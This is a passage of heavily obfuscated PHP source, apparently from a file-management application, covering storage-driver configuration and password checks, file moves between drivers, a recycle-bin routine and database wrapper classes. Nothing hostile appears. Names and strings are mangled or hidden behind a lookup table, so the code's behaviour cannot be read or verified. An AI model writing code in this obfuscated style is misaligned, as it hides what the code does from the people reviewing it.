foreach ($¾«õ·Ó‚ as $ø‡¸¹) { if ($ø‡¸¹ == $š¶ôø­¿) { continue; } if (!$ê¡¤¹îÖ->isParentOf($š¶ôø­¿, $ø‡¸¹)) { continue; } $”õËƒ´ = $ê¡¤¹îÖ->sourceInfo($ø‡¸¹); if ($”õËƒ´[$®¬åıÓ[488]] == $®¬åıÓ[91]) { $ÜßÛãë¯[] = array($®¬åıÓ[660] => array($®¬åıÓ[620], $”õËƒ´[$®¬åıÓ[589]] . $ø‡¸¹ . $®¬åıÓ[621])); } else { $ÜßÛãë¯[$®¬åıÓ[194]][1][] = $ø‡¸¹; } } if (!$ÜßÛãë¯[$®¬åıÓ[194]][1]) { unset($ÜßÛãë¯[$®¬åıÓ[194]]); } if (!$ÜßÛãë¯) { return; } if (is_array($ÜßÛãë¯[$®¬åıÓ[194]]) && is_array($ÜßÛãë¯[$®¬åıÓ[194]][1])) { $ÜßÛãë¯[$®¬åıÓ[194]][1] = array_unique($ÜßÛãë¯[$®¬åıÓ[194]][1]); } $ÜßÛãë¯[$®¬åıÓ[1100]] = $®¬åıÓ[2100]; $ê¡¤¹îÖ->where($ÜßÛãë¯)->setField($®¬åıÓ[508], 1); } private function recycleMove($£”•ö¨, $»ˆíìÂá = 1) { $˜¥ÃƒìŠ =& $_SERVER[ÅÄÇĞô]; $ÌÈÒéß = Model($˜¥ÃƒìŠ[1444]); $À¢³‰ŒØ = Model($˜¥ÃƒìŠ[2332]); $´àêš‘¾ = array($˜¥ÃƒìŠ[194] => $£”•ö¨); if ($»ˆíìÂá) { $ÌÈÒéß->where($´àêš‘¾)->setField($˜¥ÃƒìŠ[508], 1); $À¢³‰ŒØ->eventRecycle($£”•ö¨, $˜¥ÃƒìŠ[2333]); } else { $¢€”ÍªÍ = $ÌÈÒéß->where($´àêš‘¾)->find(); $¿ü³Ù§ = $¢€”ÍªÍ[$˜¥ÃƒìŠ[488]] == $˜¥ÃƒìŠ[91]; $—ÖÂ†ôæ = $ÌÈÒéß->fileNameAuto($¢€”ÍªÍ[$˜¥ÃƒìŠ[193]], $¢€”ÍªÍ[$˜¥ÃƒìŠ[32]], REPEAT_RENAME_FOLDER, $¿ü³Ù§); if ($—ÖÂ†ôæ != $¢€”ÍªÍ[$˜¥ÃƒìŠ[32]]) { $ÌÈÒéß->rename($£”•ö¨, $—ÖÂ†ôæ); } $ÌÈÒéß->where($´àêš‘¾)->setField($˜¥ÃƒìŠ[508], 0); $À¢³‰ŒØ->eventRecycle($£”•ö¨, $˜¥ÃƒìŠ[2334]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\145\155\x2e\163\157\x75\x72\143\x65\123\145\143\162\145\x74\x4c\x69\x73\x74"; public $field = array("\163\157\x75\x72\x63\x65\x49\x44", "\164\x79\x70\x65\x49\x44", "\x63\162\145\x61\x74\x65\125\163\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\163\x74\157\x72\x61\x67\x65\x4c\x69\163\x74"; public $field = array("\x6e\141\155\145", "\163\151\172\145\115\x61\170", "\x73\171\x73\x74\145\x6d", "\x64\145\x66\141\165\x6c\x74", "\x64\162\x69\x76\x65\162", "\x63\157\x6e\x66\151\x67"); public function listData($¯ŸåÅÅ« = false, $…ğòÁüÇ = "\155\x6f\144\x69\x66\171\124\151\155\x65", $Î˜¢‡‘  = false) { $¢÷à·£¢ =& $_SERVER[ÅÄÇĞô]; $û…ªÄù» = parent::listData($¯ŸåÅÅ«, $…ğòÁüÇ, $Î˜¢‡‘ ); if ($¯ŸåÅÅ«) { return $û…ªÄù»; } $ÁÌŒ¨ˆ‚ = array(); if ($GLOBALS[$¢÷à·£¢[2335]]) { $ÁÌŒ¨ˆ‚ = $this->ioSizeUseGet(array_to_keyvalue($û…ªÄù», $¢÷à·£¢[12], $¢÷à·£¢[478])); } foreach ($û…ªÄù» as $ÕƒÖ‰Ú¡ => $©¶ŸìŒŞ) { unset($û…ªÄù»[$ÕƒÖ‰Ú¡][$¢÷à·£¢[6]]); $û…ªÄù»[$ÕƒÖ‰Ú¡][$¢÷à·£¢[1986]] = isset($ÁÌŒ¨ˆ‚[$©¶ŸìŒŞ[$¢÷à·£¢[478]]]) ? $ÁÌŒ¨ˆ‚[$©¶ŸìŒŞ[$¢÷à·£¢[478]]] : 0; } return $û…ªÄù»; } public function ioSizeUseGet($½×¦‹¶) { $·†ê—Ã‡ =& $_SERVER[ÅÄÇĞô]; if (!$½×¦‹¶) { return array(); } $óšÅáşö = $·†ê—Ã‡[2336] . implode($·†ê—Ã‡[50], $½×¦‹¶); $ïÖéÍ©˜ = Cache::get($óšÅáşö); if ($ïÖéÍ©˜) { return $ïÖéÍ©˜; } $Ã•µ¶©û = array($·†ê—Ã‡[918] => $·†ê—Ã‡[478], $·†ê—Ã‡[2337] => $·†ê—Ã‡[79]); $ËƒÜ¹Æ· = array($·†ê—Ã‡[918] => array($·†ê—Ã‡[7], $½×¦‹¶)); $ïÖéÍ©˜ = Model($·†ê—Ã‡[886])->field($Ã•µ¶©û)->where($ËƒÜ¹Æ·)->group($·†ê—Ã‡[918])->select(); $ïÖéÍ©˜ = array_to_keyvalue($ïÖéÍ©˜, $·†ê—Ã‡[478], $·†ê—Ã‡[79]); Cache::set($óšÅáşö, $ïÖéÍ©˜, 600); return $ïÖéÍ©˜; } public function getConfig($ì±ÅØ±) { $²«ÜÕÇ = parent::listData($ì±ÅØ±); $«Áˆ×şÑ = _get($²«ÜÕÇ, $_SERVER[ÅÄÇĞô][6], array()); if ($«Áˆ×şÑ && !is_array($«Áˆ×şÑ)) { $«Áˆ×şÑ = json_decode($«Áˆ×şÑ, !0); } return $«Áˆ×şÑ; } public function update($àâĞŞ˜Ä, $ÀÔ×¹²ö) { $÷ùÏ”š =& $_SERVER[ÅÄÇĞô]; $ÅÎıŠÆò = $ÀÔ×¹²ö[$÷ùÏ”š[32]]; $˜æÆöÇ = array_to_keyvalue(parent::listData(), $÷ùÏ”š[32]); if (isset($˜æÆöÇ[$ÅÎıŠÆò]) && $˜æÆöÇ[$ÅÎıŠÆò][$÷ùÏ”š[478]] != $àâĞŞ˜Ä) { return !1; } $this->checkPwd($àâĞŞ˜Ä, $ÀÔ×¹²ö); if (isset($ÀÔ×¹²ö[$÷ùÏ”š[2338]]) && $ÀÔ×¹²ö[$÷ùÏ”š[2338]] == $÷ùÏ”š[91]) { $this->checkConfig($ÀÔ×¹²ö); } unset($ÀÔ×¹²ö[$÷ùÏ”š[2338]]); $™¯§Ÿ¸… = parent::update($àâĞŞ˜Ä, $ÀÔ×¹²ö); if ($™¯§Ÿ¸… && $ÀÔ×¹²ö[$÷ùÏ”š[37]]) { $ì¬æ¨Ì€ = 0; foreach ($˜æÆöÇ as $Î™™Ş) { if ($Î™™Ş[$÷ùÏ”š[37]] && $Î™™Ş[$÷ùÏ”š[478]] != $àâĞŞ˜Ä) { $ì¬æ¨Ì€ = $Î™™Ş[$÷ùÏ”š[478]]; parent::update($Î™™Ş[$÷ùÏ”š[478]], array($÷ùÏ”š[37] => 0)); } } $this->updateBackup($àâĞŞ˜Ä, $ì¬æ¨Ì€); } return $™¯§Ÿ¸…; } public function add($ò´ùâò¢) { $ØªµÖ²à =& $_SERVER[ÅÄÇĞô]; $É‡°˜¡Æ = array_to_keyvalue(parent::listData(), $ØªµÖ²à[32]); if (isset($É‡°˜¡Æ[$ò´ùâò¢[$ØªµÖ²à[32]]])) { return !1; } $this->checkConfig($ò´ùâò¢); $ß‹ŠŠÕ“ = parent::insert($ò´ùâò¢); if ($ß‹ŠŠÕ“ && $ò´ùâò¢[$ØªµÖ²à[37]]) { foreach ($É‡°˜¡Æ as $ºÌ€±ï) { if ($ºÌ€±ï[$ØªµÖ²à[37]]) { parent::update($ºÌ€±ï[$ØªµÖ²à[478]], array($ØªµÖ²à[37] => 0)); } } } return $ß‹ŠŠÕ“; } public function updateBackup($êÙêŠŸ, $ƒÕô‹éê) { $çô‡ßš =& $_SERVER[ÅÄÇĞô]; if (!$ƒÕô‹éê) { return; } $×ŒÎæã = Model($çô‡ßš[843])->config(); if ($×ŒÎæã[$çô‡ßš[1766]] != $çô‡ßš[91] || $×ŒÎæã[$çô‡ßš[847]] != $ƒÕô‹éê) { return; } $éŠÆÇ«Ô = Model($çô‡ßš[865])->get($çô‡ßš[872]); $éŠÆÇ«Ô = json_decode($éŠÆÇ«Ô, !0); if (!$éŠÆÇ«Ô) { return; } $éŠÆÇ«Ô[$çô‡ßš[847]] = $êÙêŠŸ; Model($çô‡ßš[865])->set(array($çô‡ßš[872] => $éŠÆÇ«Ô)); } public function checkPwd($°Ü†×ñå, &$“ş‰¯¾ó) { $ù–¦ù…Š =& $_SERVER[ÅÄÇĞô]; if (empty($“ş‰¯¾ó[$ù–¦ù…Š[6]])) { return; } $£•Ù = $“ş‰¯¾ó[$ù–¦ù…Š[6]]; if (!is_array($£•Ù)) { $£•Ù = json_decode($£•Ù, !0); } $±úÓ¦¦º = $ù–¦ù…Š[12]; $Íëéğƒˆ = array($ù–¦ù…Š[2339], $ù–¦ù…Š[2340], $ù–¦ù…Š[989]); foreach ($Íëéğƒˆ as $ö§°Í) { if (isset($£•Ù[$ö§°Í])) { $±úÓ¦¦º = $ö§°Í; break; } } if (!$±úÓ¦¦º) { return; } $µ¦½¯ £ = $this->getConfig($°Ü†×ñå); $«éÈ€‰˜ = $µ¦½¯ £[$±úÓ¦¦º]; $Íí’¼½š = $£•Ù[$±úÓ¦¦º]; if ($Íí’¼½š == str_repeat($ù–¦ù…Š[223], strlen($«éÈ€‰˜))) { $£•Ù[$±úÓ¦¦º] = $«éÈ€‰˜; $“ş‰¯¾ó[$ù–¦ù…Š[6]] = json_encode($£•Ù); } else { if ($Íí’¼½š != $«éÈ€‰˜) { $“ş‰¯¾ó[$ù–¦ù…Š[2338]] = $ù–¦ù…Š[91]; } } } public function checkConfig(&$·Ê‘ÚÁº, $ºÑïºŸ‹ = false) { $ğ¤è„·Ú =& $_SERVER[ÅÄÇĞô]; $Óóè²¡„ = strtolower($·Ê‘ÚÁº[$ğ¤è„·Ú[98]]); $Ö—ó«—ë = $·Ê‘ÚÁº[$ğ¤è„·Ú[6]]; if (!is_array($Ö—ó«—ë)) { $Ö—ó«—ë = json_decode($Ö—ó«—ë, !0); } foreach ($Ö—ó«—ë as $ãáô¼ø¬ => $¯½¨òè) { if (is_string($¯½¨òè)) { $Ö—ó«—ë[$ãáô¼ø¬] = trim($¯½¨òè); } } $Ö—ó«—ë[$ğ¤è„·Ú[2341]] = rand_string(6); $¡ë°ÛÌİ = $GLOBALS[$ğ¤è„·Ú[6]][$ğ¤è„·Ú[92]][$ğ¤è„·Ú[926]]; $Àï¦ï¨˜ = isset($¡ë°ÛÌİ[$Óóè²¡„]) ? $¡ë°ÛÌİ[$Óóè²¡„] : ucfirst($Óóè²¡„); $ôûÜï– = $ğ¤è„·Ú[77] . $Àï¦ï¨˜; if (!$Àï¦ï¨˜ || !class_exists($ôûÜï–)) { if ($ºÑïºŸ‹) { return LNG($ğ¤è„·Ú[2342]); } write_log(array($ğ¤è„·Ú[2343], $·Ê‘ÚÁº, get_caller_info()), $ğ¤è„·Ú[216]); show_json(LNG($ğ¤è„·Ú[2342]), !1, $·Ê‘ÚÁº); } $åì¯É = new $ôûÜï–($Ö—ó«—ë); $·õ¨É›Í = rtrim($Ö—ó«—ë[$ğ¤è„·Ú[1285]], $ğ¤è„·Ú[8]) . $ğ¤è„·Ú[8]; if (in_array($Óóè²¡„, $åì¯É->objectDriver)) { try { if (!$åì¯É->isBucketCors() && !$åì¯É->setBucketCors()) { $ªÌÕ÷ = LNG($ğ¤è„·Ú[2344]); $ªÌÕ÷ .= $ğ¤è„·Ú[2345] . LNG($ğ¤è„·Ú[2346]); } } catch (Exception $Ø†Œ „›) { $ªÌÕ÷ = $Ø†Œ „›->getMessage(); } if (isset($ªÌÕ÷)) { return $this->_parseError($ªÌÕ÷, $Óóè²¡„, $ºÑïºŸ‹); } if ($Óóè²¡„ == $ğ¤è„·Ú[68] && !$åì¯É->checkRegion()) { return $this->_parseError(LNG($ğ¤è„·Ú[2347]), $Óóè²¡„, $ºÑïºŸ‹); } } else { if ($Óóè²¡„ == $ğ¤è„·Ú[2348]) { if ($åì¯É->ftpPath) { $¡’™€¹‡ = trim($·õ¨É›Í, $ğ¤è„·Ú[8]); if (stripos($¡’™€¹‡, trim($åì¯É->ftpPath, $ğ¤è„·Ú[8])) !== 0) { $·õ¨É›Í = $åì¯É->ftpPath . $ğ¤è„·Ú[8] . ($¡’™€¹‡ ? $¡’™€¹‡ . $ğ¤è„·Ú[8] : $ğ¤è„·Ú[12]); } } } } $‚â¬îšƒ = $åì¯É->getPath($·õ¨É›Í . $ğ¤è„·Ú[1289]); try { if ($Óóè²¡„ == $ğ¤è„·Ú[109]) { $åì¯É->mkdir($·õ¨É›Í); } $±ª¥Ç’» = $åì¯É->mkfile($‚â¬îšƒ); if (!$±ª¥Ç’») { $ªÌÕ÷ = LNG($ğ¤è„·Ú[2344]); } } catch (Exception $Ø†Œ „›) { $ªÌÕ÷ = $Ø†Œ „›->getMessage(); } if (isset($ªÌÕ÷)) { return $this->_parseError($ªÌÕ÷, $Óóè²¡„, $ºÑïºŸ‹); } $Ö—ó«—ë[$ğ¤è„·Ú[1285]] = $·õ¨É›Í; $·Ê‘ÚÁº[$ğ¤è„·Ú[6]] = json_encode($Ö—ó«—ë); $·Ê‘ÚÁº[$ğ¤è„·Ú[98]] = $Àï¦ï¨˜; return !0; } private function _parseError($ïë–æ¹Ï, $Å¤‹°Åì, $ÒÂÀÒê¸ = false) { $ˆ÷ùÎå… =& $_SERVER[ÅÄÇĞô]; if ($Å¤‹°Åì == $ˆ÷ùÎå…[68] && stripos($ïë–æ¹Ï, $ˆ÷ùÎå…[2349])) { $’†ÊˆÕé = explode($ˆ÷ùÎå…[10], $ïë–æ¹Ï); $¿Çû¹Ê½ = isset($’†ÊˆÕé[1]) ? $’†ÊˆÕé[1] : $ˆ÷ùÎå…[12]; $Ò¹¶µÛ = array($ˆ÷ùÎå…[2350] => LNG($ˆ÷ùÎå…[2351]), $ˆ÷ùÎå…[2352] => LNG($ˆ÷ùÎå…[2353])); if (isset($Ò¹¶µÛ[$¿Çû¹Ê½])) { $ïë–æ¹Ï = $Ò¹¶µÛ[$¿Çû¹Ê½]; } } if (stripos($ïë–æ¹Ï, $ˆ÷ùÎå…[2354]) === 0) { $ÛÖ¶§æ = strpos($ïë–æ¹Ï, $ˆ÷ùÎå…[178]); if ($ÛÖ¶§æ === !1) { $ÛÖ¶§æ = strpos($ïë–æ¹Ï, $ˆ÷ùÎå…[4]); } if ($ÛÖ¶§æ !== !1) { $ïë–æ¹Ï = substr($ïë–æ¹Ï, $ÛÖ¶§æ + 1); } } $ïë–æ¹Ï = LNG($ˆ÷ùÎå…[1292]) . $ïë–æ¹Ï; if ($ÒÂÀÒê¸) { return $ïë–æ¹Ï; } show_json($ïë–æ¹Ï, !1); } public function driverListSystem() { $Ã‘–ÛÙß =& $_SERVER[ÅÄÇĞô]; $·é—‡« = parent::listData(); $ííİöÇ– = array(); foreach ($·é—‡« as $«Öè™öË) { unset($«Öè™öË[$Ã‘–ÛÙß[234]], $«Öè™öË[$Ã‘–ÛÙß[88]]); if (!is_array($«Öè™öË[$Ã‘–ÛÙß[6]])) { $«Öè™öË[$Ã‘–ÛÙß[6]] = json_decode($«Öè™öË[$Ã‘–ÛÙß[6]], !0); } $ííİöÇ–[] = $«Öè™öË; } return $ííİöÇ–; } public function defaultDriver() { $á«Íˆ½ä =& $_SERVER[ÅÄÇĞô]; $îû§—²Ş = parent::listData(); $©‚¸ğø» = array_filter_by_field($îû§—²Ş, $á«Íˆ½ä[37], 1); $©‚¸ğø» = $©‚¸ğø»[0]; if (!$©‚¸ğø») { return array(); } if (!is_array($©‚¸ğø»[$á«Íˆ½ä[6]])) { $©‚¸ğø»[$á«Íˆ½ä[6]] = json_decode($©‚¸ğø»[$á«Íˆ½ä[6]], !0); } return $©‚¸ğø»; } public function driverInfo($Ñß­—ÇÊ) { $íæÓî =& $_SERVER[ÅÄÇĞô]; $åÄÚÓ…û = array_to_keyvalue(parent::listData(), $íæÓî[478]); if (!isset($åÄÚÓ…û[$Ñß­—ÇÊ])) { return !1; } $Ò·à« = $åÄÚÓ…û[$Ñß­—ÇÊ]; if (!is_array($Ò·à«[$íæÓî[6]])) { $Ò·à«[$íæÓî[6]] = json_decode($Ò·à«[$íæÓî[6]], !0); } return $Ò·à«; } public function remove($öÓÓÉ¼Î) { $this->removeShareItems($öÓÓÉ¼Î); return parent::remove($öÓÓÉ¼Î); } public function removeWithFile($œığ¤ö˜, $’ˆÍöÂé, $Üˆ¼Ãº‰, $†ïÁùèñ = false) { $‘íó† =& $_SERVER[ÅÄÇĞô]; $àÍ¬Ï = array($‘íó†[918] => $œığ¤ö˜); $®ßÏ¨œ = Model($‘íó†[549])->where($àÍ¬Ï)->count(); $Îà…ÂÎŸ = Model($‘íó†[549])->where($àÍ¬Ï)->sum($‘íó†[79]); $Õ¢÷¾Ê¨ = $’ˆÍöÂé . $‘íó†[2355] . $œığ¤ö˜; $˜Ş¤ş¥â = LNG($’ˆÍöÂé == $‘íó†[628] ? $‘íó†[2356] : $‘íó†[2357]); $“Ğ°ßõÔ = new TaskFileTransfer($Õ¢÷¾Ê¨, $‘íó†[216], $®ßÏ¨œ, $˜Ş¤ş¥â . $‘íó†[465] . $Üˆ¼Ãº‰[$‘íó†[32]] . $‘íó†[215] . $œığ¤ö˜); $“Ğ°ßõÔ->task[$‘íó†[858]] = (double) $Îà…ÂÎŸ; $èãåÓİô = KodIO::defaultDriver(); $ÓîĞÎôÄ = $èãåÓİô[$‘íó†[478]]; $‚ê—á×­ = $Àåšİ = $›ÁÌ’øš = array(); $¨Úíªé = Model($‘íó†[233])->where($àÍ¬Ï)->field($‘íó†[2358])->select(); foreach ($¨Úíªé as $û–Ëõ¡¯) { $Éß¢—½Ñ = $û–Ëõ¡¯[$‘íó†[546]]; if ($†ïÁùèñ) { $Àåšİ[] = $Éß¢—½Ñ; continue; } $ª§–Ö¹ = $û–Ëõ¡¯[$‘íó†[87]]; $çö–©©‰ = get_path_father($ª§–Ö¹); $›ÁÌ’øš[] = $çö–©©‰; $çö–©©‰ = str_replace("\x7b\151\x6f\72{$œığ¤ö˜}\x7d\57", "\x7b\x69\157\72{$ÓîĞÎôÄ}\175\57", $çö–©©‰); if (!IO::exist($ª§–Ö¹)) { $‚ê—á×­[] = $Éß¢—½Ñ; $“Ğ°ßõÔ->updateFileEnd($û–Ëõ¡¯[$‘íó†[32]], $û–Ëõ¡¯[$‘íó†[79]]); write_log($‘íó†[2359] . $ª§–Ö¹, $‘íó†[1929]); continue; } $Æõî±ŠÃ = IO::move($ª§–Ö¹, $çö–©©‰, REPEAT_RENAME); if (!$Æõî±ŠÃ) { $Àåšİ[] = $Éß¢—½Ñ; $“Ğ°ßõÔ->updateFileEnd($û–Ëõ¡¯[$‘íó†[32]], $û–Ëõ¡¯[$‘íó†[79]]); write_log($‘íó†[2360] . $ª§–Ö¹, $‘íó†[1929]); continue; } $àÍ¬Ï = array($‘íó†[546] => $Éß¢—½Ñ); $ì®Íìêà = array($‘íó†[918] => $ÓîĞÎôÄ, $‘íó†[87] => $Æõî±ŠÃ); Model($‘íó†[233])->where($àÍ¬Ï)->save($ì®Íìêà); } $ºáïò«× = $“Ğ°ßõÔ->task; if (!$†ïÁùèñ) { Cache::set($Õ¢÷¾Ê¨, $ºáïò«×); } $“Ğ°ßõÔ->end(); $‚ê—á×­ = array_unique($‚ê—á×­); $Àåšİ = array_unique($Àåšİ); if (!$†ïÁùèñ && ($‚ê—á×­ || $Àåšİ)) { $ƒ®Öúšˆ = array(); if ($‚ê—á×­) { $ƒ®Öúšˆ[] = sprintf(LNG($‘íó†[2361]), count($‚ê—á×­)); } if ($Àåšİ) { $ƒ®Öúšˆ[] = sprintf(LNG($‘íó†[2362]), count($Àåšİ)); } $ƒ®Öúšˆ = sprintf(LNG($‘íó†[2363]), implode($‘íó†[2364], $ƒ®Öúšˆ)) . $‘íó†[2365] . date($‘íó†[2366]) . $‘íó†[2367]; if ($’ˆÍöÂé == $‘íó†[1966]) { $ƒ®Öúšˆ .= $‘íó†[2368] . LNG($‘íó†[2369]); } else { $ƒ®Öúšˆ = LNG($‘íó†[2370]) . $‘íó†[2371] . $ƒ®Öúšˆ; } $ºáïò«×[$‘íó†[1287]] = $ƒ®Öúšˆ; Cache::set($Õ¢÷¾Ê¨, $ºáïò«×); unset($Üˆ¼Ãº‰[$‘íó†[6]]); $›¿°­«á = array($‘íó†[478] => $œığ¤ö˜, $‘íó†[2240] => $‘íó†[628], $‘íó†[32] => $Üˆ¼Ãº‰[$‘íó†[32]], $‘íó†[98] => $Üˆ¼Ãº‰[$‘íó†[98]]); Hook::trigger($‘íó†[1808], array($‘íó†[1310] => $›¿°­«á, $‘íó†[1320] => !0)); show_json($ƒ®Öúšˆ, !1, 100111); } if ($’ˆÍöÂé == $‘íó†[628]) { return !0; } if ($‚ê—á×­ || $Àåšİ) { $³ªú£Ğ† = array_merge($‚ê—á×­, $Àåšİ); $³ªú£Ğ† = array_filter(array_unique($³ªú£Ğ†)); $this->removeByFileID($³ªú£Ğ†); } if ($›ÁÌ’øš) { $›ÁÌ’øš = array_filter(array_unique($›ÁÌ’øš)); foreach ($›ÁÌ’øš as $ª§–Ö¹) { $ó°‹°‡ø = IO::has($ª§–Ö¹, !0); if (!$ó°‹°‡ø[$‘íó†[242]] && !$ó°‹°‡ø[$‘íó†[243]]) { IO::remove($ª§–Ö¹); } } } return $this->remove($œığ¤ö˜); } private function removeByFileID($ú¬¨„š´ = array()) { $€“æ¾Ü =& $_SERVER[ÅÄÇĞô]; if (empty($ú¬¨„š´)) { return; } $åÇ‚…í = array($€“æ¾Ü[546] => array($€“æ¾Ü[7], $ú¬¨„š´)); $íâíŞë = Model($€“æ¾Ü[1444])->where($åÇ‚…í)->field($€“æ¾Ü[194])->select(); if (!$íâíŞë) { return Model($€“æ¾Ü[549])->remove($ú¬¨„š´); } $íâíŞë = array_to_keyvalue($íâíŞë, $€“æ¾Ü[12], $€“æ¾Ü[194]); foreach ($íâíŞë as $ƒ•íò¿ã) { Model($€“æ¾Ü[925])->removeNow($ƒ•íò¿ã, !1); } } private function removeShareItems($ÖØÀÌ²Å) { $ÈÕıÊë– =& $_SERVER[ÅÄÇĞô]; $”øŞ°Âµ = "\x7b\151\x6f\x3a{$ÖØÀÌ²Å}\175\x2f"; $´¨¸¢æ» = array($ÈÕıÊë–[194] => 0, $ÈÕıÊë–[1280] => array($ÈÕıÊë–[462], "{$”øŞ°Âµ}\45")); $©Ä‹–¬ù = Model($ÈÕıÊë–[1977])->where($´¨¸¢æ»)->field($ÈÕıÊë–[673])->select(); if (empty($©Ä‹–¬ù)) { return; } $¥‹¹¤Á´ = array_to_keyvalue($©Ä‹–¬ù, $ÈÕıÊë–[12], $ÈÕıÊë–[673]); Model($ÈÕıÊë–[672])->remove($¥‹¹¤Á´); } } goto Dã»ğš×ÉÖ; fÓ´½åˆ»: class DbSqlite3 extends DbSqlite3Base { public function query($ÏÕ“ß»§) { $ÒìŠ’í =& $_SERVER[ÅÄÇĞô]; if (!CacheLock::fileLock($ÒìŠ’í[13])) { return !1; } $³ŠğË‰ = parent::query($ÏÕ“ß»§); CacheLock::fileUnLock($ÒìŠ’í[13]); return $³ŠğË‰; } public function execute($ÛúŞ…‹œ) { $´¨€îê• =& $_SERVER[ÅÄÇĞô]; if (!CacheLock::fileLock($´¨€îê•[13])) { return !1; } $±†¾¡Ë‹ = parent::execute($ÛúŞ…‹œ); CacheLock::fileUnLock($´¨€îê•[13]); return $±†¾¡Ë‹; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\x68\151\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\x65\x71" => "\74\x3e", "\x67\164" => "\x3e", "\145\x67\164" => "\x3e\75", "\x6c\x74" => "\x3c", "\x65\x6c\164" => "\x3c\75", "\x6e\157\x74\x6c\x69\x6b\x65" => "\x4e\x4f\124\40\114\111\x4b\x45", "\154\x69\x6b\x65" => "\x4c\x49\x4b\x45", "\151\156" => "\111\116", "\x6e\157\164\x69\x6e" => "\116\x4f\x54\40\111\116", "\156\x6f\164\40\151\x6e" => "\116\x4f\124\x20\x49\x4e", "\142\145\x74\167\x65\145\x6e" => "\102\x45\124\127\105\x45\x4e", "\x6e\157\x74\142\145\164\x77\145\145\156" => "\116\x4f\x54\x20\102\105\124\127\105\105\x4e", "\156\x6f\164\40\142\x65\x74\167\145\145\156" => "\x4e\117\124\x20\x42\x45\x54\x57\105\x45\x4e"); protected $selectSql = "\x53\x45\x4c\105\103\124\x25\x44\111\x53\x54\111\x4e\x43\x54\45\40\45\106\x49\105\114\x44\45\x20\x46\x52\x4f\115\40\x25\124\101\102\114\x45\x25\45\112\117\x49\116\x25\x25\127\110\105\x52\105\x25\x25\107\x52\117\x55\x50\x25\45\110\101\126\111\x4e\x47\45\x25\117\x52\x44\x45\x52\45\45\114\111\x4d\111\124\45\40\45\125\x4e\x49\x4f\x4e\45\45\x43\x4f\115\x4d\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $½ĞÅÄøù = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÅÄÇĞô][1060], $½ĞÅÄøù); } public function factory($±ıß·”¶ = '') { $‹´Ö àİ =& $_SERVER[ÅÄÇĞô]; $±ıß·”¶ = $this->parseConfig($±ıß·”¶); if (empty($±ıß·”¶[$‹´Ö àİ[1061]])) { think_exception(think_lang($‹´Ö àİ[1062])); } $this->dbType = ucwords(strtolower($±ıß·”¶[$‹´Ö àİ[1061]])); $¤ÆÀÅñá = $‹´Ö àİ[1063] . $this->dbType; if (class_exists($¤ÆÀÅñá)) { $ÔŸ¿ïÑ¦ = new $¤ÆÀÅñá($±ıß·”¶); if ($‹´Ö àİ[1064] != strtolower($±ıß·”¶[$‹´Ö àİ[1061]])) { $ÔŸ¿ïÑ¦->dbType = strtoupper($this->dbType); } else { $ÔŸ¿ïÑ¦->dbType = $this->_getDsnType($±ıß·”¶[$‹´Ö àİ[1016]]); } } else { think_exception(think_lang($‹´Ö àİ[1065]) . $‹´Ö àİ[1066] . $¤ÆÀÅñá); } return $ÔŸ¿ïÑ¦; } public function __call($ô°¬‰µø, $‡ä ÷Û½) { if (method_exists($this, $ô°¬‰µø)) { return call_user_func_array(array($this, $ô°¬‰µø), $‡ä ÷Û½); } } protected function _getDsnType($ê…¿÷¥²) { $‡¯ğ•­ = explode($_SERVER[ÅÄÇĞô][4], $ê…¿÷¥²); $í‡ıë— = strtoupper(trim($‡¯ğ•­[0])); return $í‡ıë—; } private function parseConfig($×Ï€òª€ = '') { $Ãç“û¹ù =& $_SERVER[ÅÄÇĞô]; if (!empty($×Ï€òª€) && is_string($×Ï€òª€)) { $×Ï€òª€ = $this->parseDSN($×Ï€òª€); } elseif (is_array($×Ï€òª€)) { $×Ï€òª€ = array_change_key_case($×Ï€òª€); $×Ï€òª€ = array($Ãç“û¹ù[1061] => $×Ï€òª€[$Ãç“û¹ù[1067]], $Ãç“û¹ù[988] => $×Ï€òª€[$Ãç“û¹ù[1068]], $Ãç“û¹ù[989] => $×Ï€òª€[$Ãç“û¹ù[1069]], $Ãç“û¹ù[986] => $×Ï€òª€[$Ãç“û¹ù[1070]], $Ãç“û¹ù[987] => $×Ï€òª€[$Ãç“û¹ù[1071]], $Ãç“û¹ù[21] => $×Ï€òª€[$Ãç“û¹ù[1072]], $Ãç“û¹ù[1016] => $×Ï€òª€[$Ãç“û¹ù[1073]], $Ãç“û¹ù[17] => isset($×Ï€òª€[$Ãç“û¹ù[1074]]) ? $×Ï€òª€[$Ãç“û¹ù[1074]] : array()); } elseif (empty($×Ï€òª€)) { if (think_config($Ãç“û¹ù[1075]) && $Ãç“û¹ù[1064] != strtolower(think_config($Ãç“û¹ù[1076]))) { $×Ï€òª€ = $this->parseDSN(think_config($Ãç“û¹ù[1075])); } else { $×Ï€òª€ = array($Ãç“û¹ù[1061] => think_config($Ãç“û¹ù[1076]), $Ãç“û¹ù[988] => think_config($Ãç“û¹ù[1077]), $Ãç“û¹ù[989] => think_config($Ãç“û¹ù[1078]), $Ãç“û¹ù[986] => think_config($Ãç“û¹ù[1079]), $Ãç“û¹ù[987] => think_config($Ãç“û¹ù[1080]), $Ãç“û¹ù[21] => think_config($Ãç“û¹ù[326]), $Ãç“û¹ù[1016] => think_config($Ãç“û¹ù[1075]), $Ãç“û¹ù[17] => think_config($Ãç“û¹ù[1081])); } } return $×Ï€òª€; } protected function initConnect($¤šœË— = true) { if (1 == think_config($_SERVER[ÅÄÇĞô][22])) { $this->_linkID = $this->multiConnect($¤šœË—); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $‚ûÎôö => $Íµë¡“Õ) { $this->_linkID = $Íµë¡“Õ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($’´‹†–Œ = false) { $îÊƒ–¢¾ =& 